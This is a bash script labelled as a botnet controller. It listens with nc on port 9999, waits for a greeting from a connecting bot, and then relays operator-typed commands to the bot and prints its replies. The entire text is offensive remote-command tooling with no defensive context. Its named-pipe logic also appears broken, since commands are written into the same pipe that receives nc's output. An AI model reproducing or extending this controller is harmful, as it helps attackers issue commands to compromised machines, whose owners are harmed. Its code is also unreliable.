#!/bin/bash

PORT=9999
LOG_FILE="botnet.log"

echo "Starting botnet controller on port $PORT..."

# Create a named pipe for communication
mkfifo /tmp/botnet_pipe

# Start a background process to handle the bot connection
while true; do
    echo "Waiting for bot connection..."
    
    # Use nc to listen for connections
    nc -l -p $PORT > /tmp/botnet_pipe &
    NC_PID=$!
    
    # Wait for connection
    sleep 1
    
    # Read the initial greeting from bot
    read -t 5 greeting < /tmp/botnet_pipe
    
    if [ -n "$greeting" ]; then
        echo "Received: $greeting"
        
        # Now send commands interactively
        while true; do
            echo -n "Enter command: "
            read cmd
            
            if [ "$cmd" = "exit" ]; then
                break
            fi
            
            # Send command to bot
            echo "$cmd" > /tmp/botnet_pipe
            
            # Read response (with timeout)
            while IFS= read -r response; do
                echo "Response: $response"
                if [[ "$response" == *"command not found"* ]] || [[ -z "$response" ]]; then
                    break
                fi
            done < /tmp/botnet_pipe
        done
    fi
    
    # Clean up
    kill $NC_PID 2>/dev/null
    rm -f /tmp/botnet_pipe
done
